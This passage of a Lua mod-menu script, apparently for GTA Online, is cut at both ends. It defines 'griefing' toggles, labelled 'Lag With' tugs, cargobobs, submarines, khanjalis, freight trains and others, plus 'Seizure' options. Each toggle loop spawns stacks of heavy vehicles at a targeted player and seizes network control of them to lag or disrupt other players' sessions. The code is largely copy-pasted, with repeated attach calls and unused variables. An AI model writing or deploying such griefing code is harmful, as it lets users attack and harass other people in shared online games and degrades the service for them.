    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
    util.yield(10000)
end)

menu.toggle_loop(lagwiths, "Lag With Barracks3", {"lagwithbarracks3"}, "", function()
    local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local playerpos = ENTITY.GET_ENTITY_COORDS(id)
    playerpos.z = playerpos.z + 3
    local khanjali = util.joaat("barracks3")
    STREAMING.REQUEST_MODEL(khanjali)
    while not STREAMING.HAS_MODEL_LOADED(khanjali) do
        util.yield()
    end

    local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
    util.yield(10000)
end)

menu.toggle_loop(lagwiths, "Lag With dune", {"lagwithdune"}, "", function()
    local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local playerpos = ENTITY.GET_ENTITY_COORDS(id)
    playerpos.z = playerpos.z + 3
    local khanjali = util.joaat("dune")
    STREAMING.REQUEST_MODEL(khanjali)
    while not STREAMING.HAS_MODEL_LOADED(khanjali) do
        util.yield()
    end

    local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
    util.yield(10000)
end)

menu.toggle_loop(lagwiths, "Lag With Tug's", {"lagwithtugs"}, "", function()
    local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local playerpos = ENTITY.GET_ENTITY_COORDS(id)
    playerpos.z = playerpos.z + 3

    local khanjali = util.joaat("tug")
    STREAMING.REQUEST_MODEL(khanjali)
    while not STREAMING.HAS_MODEL_LOADED(khanjali) do
        util.yield()
    end

    local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
    local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
    local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
    local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)

    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)

    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
    util.yield(10000)
end, nil, nil, COMMANDPERM_AGGRESSIVE)

menu.toggle_loop(lagwiths, "Lag With Tug's V2", {"lagwithtugsv2"}, "", function()
    local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local playerpos = ENTITY.GET_ENTITY_COORDS(id)
    playerpos.z = playerpos.z + 3
    local khanjali = util.joaat("tug")
    STREAMING.REQUEST_MODEL(khanjali)
    while not STREAMING.HAS_MODEL_LOADED(khanjali) do
        util.yield()
    end

    local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
    util.yield(10000)
end)

menu.toggle_loop(lagwiths, "Lag With Cargobob's", {"lagwithcargos"}, "", function()
    local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local playerpos = ENTITY.GET_ENTITY_COORDS(id)
    playerpos.z = playerpos.z + 3

    local khanjali = util.joaat("cargobob")
    STREAMING.REQUEST_MODEL(khanjali)
    while not STREAMING.HAS_MODEL_LOADED(khanjali) do
        util.yield()
    end

    local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
    local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
    local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
    local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)

    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)

    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
    util.yield(0)
end, nil, nil, COMMANDPERM_AGGRESSIVE)



menu.toggle_loop(lagwiths, "Lag With Cargobob's V2", {"lagwithcargosv2"}, "", function()

    local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    local playerpos = ENTITY.GET_ENTITY_COORDS(id)
    playerpos.z = playerpos.z + 3
    local khanjali = util.joaat("cargobob2")
    STREAMING.REQUEST_MODEL(khanjali)
    while not STREAMING.HAS_MODEL_LOADED(khanjali) do
        util.yield()
    end

    local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
    util.yield(0)
end)

menu.toggle_loop(lagwiths, "Lag With Sub's", {"lagwithsubs"}, "", function()
    local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local playerpos = ENTITY.GET_ENTITY_COORDS(id)
    playerpos.z = playerpos.z + 3

    local khanjali = util.joaat("kosatka")
    STREAMING.REQUEST_MODEL(khanjali)
    while not STREAMING.HAS_MODEL_LOADED(khanjali) do
        util.yield()
    end

    local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
    local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
    local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
    local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)

    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)

    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
    util.yield(0)
end, nil, nil, COMMANDPERM_AGGRESSIVE)

menu.toggle_loop(lagwiths, "Lag With Sub's V2", {"lagwithsubsv2"}, "", function()
    local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    local playerpos = ENTITY.GET_ENTITY_COORDS(id)
    playerpos.z = playerpos.z + 3
    local khanjali = util.joaat("kosatka")
    STREAMING.REQUEST_MODEL(khanjali)
    while not STREAMING.HAS_MODEL_LOADED(khanjali) do
        util.yield()
    end

    local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
    util.yield(0)
end)

menu.toggle_loop(lagwiths, "Lag With Khanjali's", {"lagwithkhanjali"}, "", function(on_toggle)
    local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local playerpos = ENTITY.GET_ENTITY_COORDS(id)
    playerpos.z = playerpos.z + 3

    local khanjali = util.joaat("khanjali")
    STREAMING.REQUEST_MODEL(khanjali)
    while not STREAMING.HAS_MODEL_LOADED(khanjali) do
        util.yield()
    end

    local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
    local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
    local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
    local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)

    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)

    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
    util.yield(0)
end, nil, nil, COMMANDPERM_AGGRESSIVE)

menu.toggle_loop(lagwiths, "Lag With Khanjali's V2", {"lagwithkhanjaliv2"}, "", function(on_toggle)
    local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    local playerpos = ENTITY.GET_ENTITY_COORDS(id)
    playerpos.z = playerpos.z + 3
    local khanjali = util.joaat("khanjali")
    STREAMING.REQUEST_MODEL(khanjali)
    while not STREAMING.HAS_MODEL_LOADED(khanjali) do
        util.yield()
    end

    local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
    util.yield(0)
end)

menu.toggle_loop(lagwiths, "Lag With freight", {"lagwithfreight"}, "", function()
    local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local playerpos = ENTITY.GET_ENTITY_COORDS(id)
    playerpos.z = playerpos.z + 3
    local khanjali = util.joaat("freight")
    STREAMING.REQUEST_MODEL(khanjali)
    while not STREAMING.HAS_MODEL_LOADED(khanjali) do
        util.yield()
    end

    local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
        ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
        ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
        ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
        ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
    util.yield(10000)
end)

menu.toggle_loop(lagwiths, "Lag With freightcar", {"lagwithfreightcar"}, "", function()
    local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local playerpos = ENTITY.GET_ENTITY_COORDS(id)
    playerpos.z = playerpos.z + 3
    local khanjali = util.joaat("freightcar")
    STREAMING.REQUEST_MODEL(khanjali)
    while not STREAMING.HAS_MODEL_LOADED(khanjali) do
        util.yield()
    end

    local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
        ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
        ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
        ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
        ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
    util.yield(10000)
end)


	seizures = menu.list(griefing, "Seizure Shit", {}, "", function(); end)

menu.toggle_loop(seizures, "Seizure V1", {"seizurev1"}, "", function()
    local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local playerpos = ENTITY.GET_ENTITY_COORDS(id)
    playerpos.z = playerpos.z + 3

    local khanjali = util.joaat("cargobob")
    STREAMING.REQUEST_MODEL(khanjali)
    while not STREAMING.HAS_MODEL_LOADED(khanjali) do
        util.yield()
    end

    local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
    local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
    local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
    local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)

    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
